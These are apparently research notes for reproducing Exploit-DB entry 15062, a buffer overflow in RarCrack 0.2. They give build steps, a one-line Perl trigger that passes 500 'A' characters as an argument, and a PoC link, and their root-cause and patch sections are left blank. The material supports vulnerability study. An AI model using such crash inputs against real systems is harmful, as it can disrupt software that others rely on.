# EDB-15062

## Experiment Environment

Ubuntu 10.04

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-15062/rarcrack-0.2.tar.bz2
tar -xvf rarcrack-0.2.tar.gz
cd rarcrack-0.2
./configure
make
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
./rarcrack `perl -e 'print "A" x500'`
```

## PoCs

[RarCrack 0.2 - 'Filename init() .bss' (PoC)](https://www.exploit-db.com/exploits/15062/)

## Vulnerability Details & Patch

### Root Cause

### Stack Trace

### Patch

## References
